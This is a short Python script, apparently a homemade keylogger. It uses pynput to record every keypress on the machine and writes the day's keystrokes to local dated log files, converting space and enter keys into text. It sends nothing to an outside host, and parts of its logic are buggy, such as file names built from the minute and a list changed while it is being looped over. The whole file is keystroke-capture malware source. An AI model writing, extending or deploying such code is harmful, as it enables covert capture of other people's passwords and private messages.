from threading import Thread
from pynput.keyboard import Listener
from datetime import datetime, timedelta
from pathlib import Path

current_date = datetime.now()
previous_date = datetime.now()
keys_fo_the_day = []
keys_previous_day = []
days_run = 0
countid = 0


def create_new_text():
    global current_date
    while True:
        current_date = datetime.now()
        if not Path("./log{}.txt".format(current_date.date())).is_file():
            with open('log{}.txt'.format(current_date.date()), 'w') as file:
                file.close()

def writeloop():
    global countid
    global days_run
    global previous_date
    def write_keys(list):
        global keys_previous_day
        with open('log{}.txt'.format(previous_date.minute), 'w') as logfile:
            for previouskey, key in zip(keys_previous_day, keys_previous_day[1:]):
                key = str(key).replace("'", "").replace("Key.space", " ").replace("Key.enter", "\n")
                if keys_previous_day[0] == "Key.backspace":
                    keys_previous_day = keys_previous_day[1:]
                if key == "Key.backspace":
                    keys_previous_day.remove(key)
                    keys_previous_day.remove(previouskey)
                logfile.write(str(key))
                
    while True:
        if current_date.date() == previous_date.date() + timedelta(days=1):
            days_run +=1
            if countid != days_run:
                keys_previous_day = keys_fo_the_day.copy()
                write_keys(keys_previous_day)
                keys_fo_the_day.clear()
                previous_date = datetime.now()
                countid += 1

def keypress(key):
    keys_fo_the_day.append(key)


X = Listener(on_press=keypress)

thread1 = Thread(target=create_new_text)
thread2 = Thread(target=writeloop)
thread2.isDaemon()
thread1.isDaemon()
thread1.start()
thread2.start()
X.start()

